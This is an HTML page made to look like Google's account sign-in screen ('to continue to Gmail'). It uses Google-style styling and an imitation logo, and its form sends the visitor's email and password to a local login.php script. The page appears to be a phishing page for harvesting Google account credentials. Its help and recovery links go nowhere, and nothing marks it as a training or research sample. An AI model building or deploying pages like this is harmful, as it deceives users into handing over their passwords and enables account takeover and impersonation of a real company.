<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Google Sans', arial, sans-serif;
            background-color: #fff;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-card {
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 40px;
        }

        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            height: 56px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }

        .forgot-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-top: 9px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .btn-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .create-account:hover { background-color: #f6fafe; }

        .btn-next {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .btn-next:hover {
            background-color: #1b66ca;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149);
        }

        .footer {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #747775;
        }

        @media (max-width: 450px) {
            .login-card { border: none; padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="login-card">
        <svg class="logo" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M11.64 5.2a5.4 5.4 0 0 1 5.3 4.4h2.2A7.6 7.6 0 1 0 11.64 19a7.5 7.5 0 0 0 5.4-2.2l-1.5-1.5a5.4 5.4 0 1 1-3.9-10.1zM31.14 11a4.2 4.2 0 1 0-8.4 0 4.2 4.2 0 0 0 8.4 0zm-2.2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm10.6 0a4.2 4.2 0 1 0-8.4 0 4.2 4.2 0 0 0 8.4 0zm-2.2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm6-4.6h2.2v12.4h-2.2zm11.2 4.6a4.2 4.2 0 0 0-7.3-3l1.5 1.5a2 2 0 0 1 3.6 1.5 2 2 0 0 1-5.8 1.5l-1.5 1.5a4.2 4.2 0 0 0 9.5-3zM5.94 11a4.2 4.2 0 1 1-8.4 0 4.2 4.2 0 0 1 8.4 0z" fill="#4285F4"/>
            <path d="M54.54 11a4.2 4.2 0 1 0-8.4 0 4.2 4.2 0 0 0 8.4 0zm-2.2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z" fill="#EA4335"/>
            <path d="M5.94 11a4.2 4.2 0 1 1-8.4 0 4.2 4.2 0 0 1 8.4 0z" fill="#FBBC05"/>
            <path d="M5.94 11a4.2 4.2 0 1 1-8.4 0 4.2 4.2 0 0 1 8.4 0z" fill="#34A853"/>
            <text x="0" y="20" font-family="'Product Sans', sans-serif" font-size="24" fill="#202124">Google</text>
        </svg>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>
        
        <form action="login.php" method="POST">
            <div class="input-group">
                <input type="email" name="email" class="input-field" placeholder="Email or phone" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <input type="password" name="password" class="input-field" placeholder="Enter your password" required autocomplete="current-password">
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>

            <div class="btn-container">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>

        <div class="footer">
            <span>English (United States)</span>
            <div style="display: flex; gap: 16px;">
                <span>Help</span>
                <span>Privacy</span>
                <span>Terms</span>
            </div>
        </div>
    </div>
</body>
</html>
